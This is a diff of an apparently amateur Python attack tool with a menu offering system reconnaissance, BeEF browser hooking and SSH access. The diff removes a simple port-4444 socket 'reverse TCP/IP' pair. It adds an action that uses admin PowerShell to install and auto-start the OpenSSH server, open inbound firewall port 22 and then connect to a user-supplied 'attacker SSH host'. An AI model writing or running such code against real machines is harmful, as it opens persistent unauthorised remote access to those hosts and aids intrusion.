@@ -12,22 +12,12 @@ import socket
 import sys
 from time import sleep
 import platform
-
-#action 3 = listener for reverse TCP/IP
-def listener():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('0.0.0.0', 4444))  # Listen on all interfaces
-    s.listen(1)
-    print("Listener started on port 4444...")
-    conn, addr = s.accept()
-    print(f"Connection from {addr}")
-    data = conn.recv(1024)
-    print("Received:", data.decode())
-    conn.sendall(b"ACK: " + data)
-    conn.close()
-    s.close()
+import subprocess
 
 
+
+print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
+sleep(4)
 
 #scanverify = if you dont understand go to action 0, it verifies if the scan was initiated first
 scanverify = "no"
@@ -58,9 +48,7 @@ while True:
     sleep(0.1)
     print("2) Attempt to hook this machine via BeEF")
     sleep(0.1)
-    print("3) Attempt a local reverse TCP/IP connection")
-    sleep(0.1)
-    print("4) Attempt a local SSH connection")
+    print("3) Attempt a local SSH connection")
     sleep(0.1)
     print("")
     sleep(0.1)
@@ -71,9 +59,7 @@ while True:
     if action == "1":
         scanverify = "yes"
         cls()
-        print("Gathering system information...")
         sleep(1)
-        #gather system information using platform module
         print("System Information:")
         sleep(0.1)
         system=platform.system()
@@ -93,7 +79,6 @@ while True:
         s.connect(("8.8.8.8", 80))
         print(Fore.RED + s.getsockname()[0])
         s.close()
-        print("System information gathered.")
         sleep(1)
         input("Press Enter to continue...")
     
@@ -142,36 +127,33 @@ while True:
         sleep(3)
         exit()
 
-#Action 3 = reverse TCP/IP
+#Action 3 = local SSH connection
     if action == "3":
-        print(Fore.RED + "!!!WARNING!!!")
-        sleep(1)
-        print("This action requires the attacker to run a .py script")
-        sleep(2)
+        #stating the PS comand to add firewall rule for opening SSH
+        ps_command = 'New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH Server" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22'
+        ps_command_install = "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
+        ps_command_start_service = "Start-Service sshd"
+        ps_command_auto_start = "Set-Service -Name sshd -StartupType 'Automatic'"
+        #stating to TRY the command, if it fails, CATCH the error and print it
+        try:
+            subprocess.run(["powershell", "-Command", ps_command_install], check=True)
+            subprocess.run(["powershell", "-Command", ps_command_start_service], check=True)
+            subprocess.run(["powershell", "-Command", ps_command_auto_start], check=True)
+            subprocess.run(["powershell", "-Command", ps_command], check=True)
+            print(Fore.GREEN + "Firewall rule for SSH added successfully.")
+
+        except subprocess.CalledProcessError as e:
+            print(Fore.RED + "Failed to add firewall rule for SSH: " + str(e))
+
+        sshuser=input("Enter attacker SSH username: ")
+        sshhost=input("Enter attacker SSH host (IP or hostname): ")
         cls()
-
-        print("Which .py script to run: ")
-        sleep(0.1)
+        print("Attempting to connect to " + sshhost + " with user " + sshuser)
+        sleep(1)
+        try:
+            subprocess.run(["ssh", f"{sshuser}@{sshhost}"])
+        except Exception as e:
+            print(Fore.RED + "Failed to start SSH connection: " + str(e))
+            sleep(2)
+    else:
         print("")
-        sleep(0.1)
-        print("1) Attacker machine (.py reverse TCP/IP listener starter) ")                                              
-        sleep(0.1)                                                                                                       
-        print("2) Target machine (.py reverse TCP/IP starter) ")                                                         
-
-        while True:                                                    
-            #listener / target machine
-            tcpaction = input("Your action: ")
-            if tcpaction == "1":
-                def connector(server_ip = input("Input attacker IP (without port): ")):
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((server_ip, 4444))
-                    s.sendall(b"Hello from client")
-                    resp = s.recv(1024)
-                    print("Server replied:", resp.decode())
-                    s.close()
-
-                connector()
-            elif tcpaction == "2":
-                listener()
-            else:
-                print("")
